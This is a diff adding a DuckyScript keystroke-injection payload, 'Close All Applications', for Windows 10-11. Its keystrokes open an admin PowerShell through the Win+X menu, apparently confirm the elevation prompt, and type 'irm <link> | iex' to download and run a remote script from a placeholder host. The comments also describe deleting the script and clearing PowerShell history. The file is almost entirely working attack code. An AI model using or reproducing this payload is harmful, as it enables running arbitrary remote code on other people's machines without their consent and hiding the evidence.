@@ -1,0 +1,44 @@
+REM #####################################################
+REM #                                                   |
+REM # Title        : Close All Applications             |
+REM # Author       : Aleff                              |
+REM # Version      : 1.0                                |
+REM # Category     : Execution                          |
+REM # Target       : Windows 10-11                      |
+REM #                                                   |
+REM #####################################################
+
+REM Plug-And-Play
+
+REM 
+REM 1. Open a powershell
+REM 2. Download a Python script
+REM 3. Execute it
+REM 4. Remove Python script downloaded
+REM 5. Delete powershell history
+REM
+
+REM Reply with YOUR LINK. The Payload should be close_all_app.ps1
+DEFINE POWERSHEL_CODE example.com
+
+DELAY 2000
+GUI x
+DELAY 250
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+ENTER
+DELAY 1000
+TAB
+TAB
+ENTER
+DELAY 2000
+STRING irm POWERSHEL_CODE | iex
+ENTER
